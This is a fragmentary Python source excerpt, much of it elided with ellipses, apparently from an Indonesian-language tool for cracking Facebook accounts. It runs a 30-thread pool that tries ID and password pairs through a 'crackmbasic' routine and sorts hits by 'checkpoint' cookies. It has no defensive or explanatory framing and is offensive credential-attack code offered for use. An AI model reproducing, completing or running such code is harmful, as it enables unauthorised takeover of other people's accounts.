...
def menu(my_name,my_id):
	...
	cetak(nel('\tAtas Nama [green]%s[white] burik'%(my_name)))
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]>>[green] SELAMAT TINGGAL R&J [cyan] <<[white] '))
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]R&J OK[/bold green]'))
					ok+=1
					break
